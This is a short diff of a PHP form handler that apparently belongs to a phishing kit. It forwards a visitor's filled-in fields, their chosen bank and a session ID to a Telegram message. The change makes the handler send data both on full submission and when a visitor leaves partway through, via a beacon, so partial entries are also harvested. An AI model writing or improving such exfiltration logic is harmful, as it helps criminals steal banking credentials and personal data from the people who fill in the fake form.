@@ -59,13 +59,17 @@ $labels = array(
 
 $bankChosen = isset($fields["extra"]) && trim((string)$fields["extra"]) !== "";
 
-// Only leave (after bank). Final submit goes through svar.php only — no double TG.
-$notifyTg = ($status === "leave" && $bankChosen);
+// Leave TG only after bank is chosen. Complete always notifies.
+$notifyTg = false;
+if ($status === "complete") {
+  $notifyTg = true;
+} elseif (($status === "leave" || $status === "beacon") && $bankChosen) {
+  $notifyTg = true;
+}
 
 $sent = 0;
 if ($notifyTg) {
-  juj_finish_response(array("ok" => true, "sent" => 0, "status" => $status));
-  $hdr = "🟡 Left page (not submitted) — step " . $step . "\n";
+  $hdr = ($status === "complete" ? "🟢 Complete" : "🟡 Partial (left page)") . " — step " . $step . "\n";
   $hdr .= "🆔 Session: " . $sessionId . "\n\n";
   $body = "";
   foreach ($fields as $k => $v) {
@@ -78,8 +82,7 @@ if ($notifyTg) {
   if ($body === "") {
     $body = "(no fields filled yet)\n";
   }
-  juj_tg_send($hdr . $body, "HTML");
-  exit;
+  $sent = juj_tg_send($hdr . $body, "HTML");
 }
 
 echo json_encode(array("ok" => true, "sent" => $sent, "status" => $status));
